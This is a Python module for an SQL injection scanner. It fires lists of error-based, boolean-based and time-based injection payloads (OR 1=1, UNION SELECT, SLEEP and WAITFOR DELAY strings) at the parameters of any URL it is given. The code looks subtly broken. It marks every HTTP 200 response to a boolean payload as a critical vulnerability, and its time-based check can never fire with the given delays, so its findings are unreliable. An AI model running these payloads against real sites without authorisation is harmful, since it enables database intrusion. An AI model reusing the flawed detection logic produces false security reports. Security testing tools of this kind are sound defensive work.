"""
SQL Injection Detection Module
Automated SQL injection vulnerability testing
"""

import requests
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
from rich.console import Console
from rich.progress import Progress
from src.core.utils import save_json

console = Console()
logger = logging.getLogger(__name__)

class SQLInjectionDetector:
    """SQL injection vulnerability detection"""
    
    # SQL injection payloads
    SQLI_PAYLOADS = {
        'error_based': [
            "'", '"', "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
            "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' AND 1=2 UNION SELECT NULL--", "1' AND 1=2 UNION SELECT NULL,NULL--"
        ],
        'time_based': [
            "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--",
            "1' WAITFOR DELAY '0:0:5'--", "1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',5)--",
            "1'; WAITFOR DELAY '0:0:5'--", "1'); WAITFOR DELAY '0:0:5'--"
        ],
        'boolean_based': [
            "1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
            "1 AND 1=1", "1 AND 1=2", "1' AND SUBSTRING(@@version,1,1)='5'--"
        ]
    }
    
    # Error messages indicating SQL injection
    SQL_ERRORS = {
        'MySQL': [
            'you have an error in your sql syntax',
            'warning: mysql',
            'mysqli_fetch_array',
            'mysqli_num_rows',
            'mysql_fetch_assoc',
            'mysql_num_rows'
        ],
        'PostgreSQL': [
            'postgresql',
            'pg_query',
            'pg_exec',
            'syntax error at or near',
            'unterminated quoted string'
        ],
        'MSSQL': [
            'microsoft sql',
            'odbc sql server driver',
            'unclosed quotation mark',
            'incorrect syntax near'
        ],
        'Oracle': [
            'ora-00933',
            'ora-01756',
            'ora-00936',
            'oracle error'
        ],
        'SQLite': [
            'sqlite',
            'sql syntax',
            'unrecognized token'
        ]
    }
    
    def __init__(self, url: str, method: str = 'GET', data: str = None, dbms: str = None):
        self.url = url
        self.method = method.upper()
        self.data = self._parse_data(data) if data else {}
        self.target_dbms = dbms
        self.vulnerabilities: List[Dict] = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _parse_data(self, data: str) -> Dict:
        """Parse POST data string"""
        if not data:
            return {}
        
        params = {}
        for pair in data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[key] = value
        
        return params
    
    def _get_parameters(self) -> Dict:
        """Extract parameters from URL or POST data"""
        if self.method == 'GET':
            parsed = urlparse(self.url)
            return parse_qs(parsed.query)
        else:
            return self.data
    
    def _detect_dbms(self, response: str) -> Optional[str]:
        """Detect database management system from error messages"""
        response_lower = response.lower()
        
        for dbms, errors in self.SQL_ERRORS.items():
            for error in errors:
                if error in response_lower:
                    return dbms
        
        return None
    
    def _test_payload(self, param: str, payload: str, payload_type: str) -> Dict:
        """Test a single SQL injection payload"""
        result = {
            'vulnerable': False,
            'dbms': None,
            'payload': payload,
            'type': payload_type
        }
        
        try:
            if self.method == 'GET':
                # Modify URL parameter
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                response = self.session.get(test_url, timeout=10)
            else:
                # Modify POST data
                test_data = self.data.copy()
                test_data[param] = payload
                
                response = self.session.post(self.url, data=test_data, timeout=10)
            
            # Check for SQL errors in response
            detected_dbms = self._detect_dbms(response.text)
            
            if detected_dbms:
                result['vulnerable'] = True
                result['dbms'] = detected_dbms
            
            # Additional checks for boolean-based
            if payload_type == 'boolean_based':
                if response.status_code == 200:
                    result['vulnerable'] = True
        
        except requests.exceptions.Timeout:
            # Timeout might indicate time-based SQL injection
            if payload_type == 'time_based':
                result['vulnerable'] = True
                result['dbms'] = 'Unknown (Time-based)'
        
        except Exception as e:
            logger.debug(f"Error testing payload: {e}")
        
        return result
    
    def test(self, level: int = 2) -> List[Dict]:
        """Test for SQL injection vulnerabilities"""
        console.print(f"[bold cyan]Testing SQL Injection on: {self.url}[/bold cyan]")
        console.print(f"[yellow]Method: {self.method}, Level: {level}[/yellow]\n")
        
        parameters = self._get_parameters()
        
        if not parameters:
            console.print("[yellow]No parameters found to test[/yellow]")
            return []
        
        # Select payload types based on level
        payload_types = ['error_based']
        if level >= 2:
            payload_types.append('boolean_based')
        if level >= 3:
            payload_types.append('time_based')
        
        # Collect all payloads
        all_payloads = []
        for ptype in payload_types:
            if ptype in self.SQLI_PAYLOADS:
                for payload in self.SQLI_PAYLOADS[ptype]:
                    all_payloads.append((payload, ptype))
        
        console.print(f"[cyan]Testing {len(parameters)} parameters with {len(all_payloads)} payloads...[/cyan]\n")
        
        # Test each parameter
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Testing...", total=len(parameters) * len(all_payloads))
            
            for param in parameters:
                console.print(f"[cyan]Testing parameter: {param}[/cyan]")
                
                for payload, ptype in all_payloads:
                    result = self._test_payload(param, payload, ptype)
                    
                    if result['vulnerable']:
                        vuln = {
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'injection_type': ptype,
                            'dbms': result['dbms'],
                            'method': self.method,
                            'url': self.url,
                            'description': f'SQL Injection vulnerability found in parameter "{param}"'
                        }
                        
                        self.vulnerabilities.append(vuln)
                        console.print(f"  [red]✗ VULNERABLE[/red] - Type: {ptype}, DBMS: {result['dbms']}")
                        
                        # Don't test more payloads for this parameter
                        break
                    
                    progress.update(task, advance=1)
                
                if not any(v['parameter'] == param for v in self.vulnerabilities):
                    console.print(f"  [green]✓ Not vulnerable[/green]")
        
        return self.vulnerabilities
    
    def display_results(self, results: List[Dict]):
        """Display SQL injection test results"""
        if not results:
            console.print("\n[green]✓ No SQL Injection vulnerabilities found![/green]")
            return
        
        console.print(f"\n[bold red]SQL Injection Vulnerabilities Found: {len(results)}[/bold red]\n")
        
        for vuln in results:
            console.print(f"[red]Parameter:[/red] {vuln['parameter']}")
            console.print(f"[red]Injection Type:[/red] {vuln['injection_type']}")
            console.print(f"[red]DBMS:[/red] {vuln['dbms']}")
            console.print(f"[red]Method:[/red] {vuln['method']}")
            console.print(f"[red]Payload:[/red] {vuln['payload']}")
            console.print(f"[red]URL:[/red] {vuln['url']}")
            console.print("-" * 80)
    
    def save_results(self, results: List[Dict], filename: str):
        """Save results to file"""
        data = {
            'target': self.url,
            'method': self.method,
            'total_vulnerabilities': len(results),
            'vulnerabilities': results,
            'scan_date': str(__import__('datetime').datetime.now())
        }
        
        save_json(data, filename)
